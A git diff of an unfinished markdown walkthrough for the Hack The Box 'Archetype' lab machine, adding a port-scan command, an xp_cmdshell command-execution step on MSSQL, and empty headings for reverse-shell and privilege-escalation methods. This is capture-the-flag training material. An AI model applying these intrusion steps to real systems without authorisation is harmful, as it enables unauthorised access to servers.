@@ -4,15 +4,15 @@ description: Walk through of the archetype machine
 
 # Archetype (HTB Starting Point 3x1)
 
-### Target Details
+## Target Details
 
 IP address: 10.129.95.187
 
-## Full Walkthrough
+## Full Walk through
 
 ### Port scan
 
-We use naabu and nmap-cli to spped up the usual port scan.
+We use `naabu` with `nmap-cli` to speed up the usual port scan.
 
 ```bash
 naabu -host 10.129.95.187 -p - -nmap-cli 'nmap -sV -sC nmap-output'
@@ -260,7 +260,34 @@ SQL> help
 
 We can enable xp\_cmdshell even though it is disabled by default.
 
+After enabling it we can find the username that has access to the service:
 
+```bash
+SQL> xp_cmdshell "powershell -c whoami"
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+archetype\sql_svc                                                                  
+
+NULL
+```
+
+Since we are in the `C:\Windows\system32` directory, we cannot make changes here as the Administrator can only make changes in this directory.
+
+We can change to `C:\Users\Public` directory for downloading shells and privilege escalation executable.  Since there is no persistence we will have to use the `cd` command chained with other commands.
+
+### Privilege Escalation
+
+Now that we have&#x20;
+
+### Using metasploit
+
+### Using netcat reverse shell
+
+### Using impacket-psexec
+
+### Using evil-winrm
 
 
 
